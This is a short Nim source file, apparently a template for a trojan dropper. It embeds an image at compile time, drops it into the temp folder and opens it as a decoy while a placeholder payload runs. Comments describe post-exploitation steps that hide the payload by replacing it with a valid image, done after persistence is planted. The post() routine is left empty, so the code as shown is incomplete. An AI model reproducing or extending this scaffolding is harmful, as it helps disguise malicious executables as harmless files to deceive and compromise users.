import os
import strutils

# Compile-time constants, this is supposed to be filled by main application, don't bother trying to pass it manually
const FilePath {.strdefine.}: string = "../pict.jpg"

# Example payload, in some case you can just edit this line
# if u don't provide a payload on generation then this is the default one.
type
    HANDLE* = int
    HWND* = HANDLE
    UINT* = int32
    LPCSTR* = cstring
proc ShellExecute(hwnd:HWND, lpOperation:LPCSTR, lpFile:LPCSTR, lpParameters:LPCSTR, lpDirectory:LPCSTR, nShowCmd:int):void 
    {.importc: "ShellExecuteA", header:"windows.h".}
proc MessageBox(hWnd: HWND, lpText: LPCSTR, lpCaption: LPCSTR, uType: UINT): int32 
    {.discardable, stdcall, dynlib: "user32", importc: "MessageBoxA".}
proc r2():void = 
    MessageBox(0, "Mommy! ", "Love u",  0)

# Post exploitation payload, can be anything
# But the basic implementation is to remove the payload file and change it into valid image files (or any file really)
# of course this should be done after u had planted the persistence techniques
proc post():void =
    
# Compile-time variable (?) its the content of defined files
const FileData = slurp(FilePath)
var delimiter = "/"
if count(FilePath, "\\") > 0:
    delimiter = "\\"
var splitted = rsplit(FilePath, delimiter)
let FileName = splitted[splitted.len - 1]

var tempPath = getTempDir()
if not dirExists(tempPath):
  createDir(tempPath)
writeFile(tempPath&FileName, FileData)
# Run the file with default app
# Or u can put these two function calls on different threads
ShellExecute(0, "open", tempPath&FileName, nil, nil, 0)
r2()
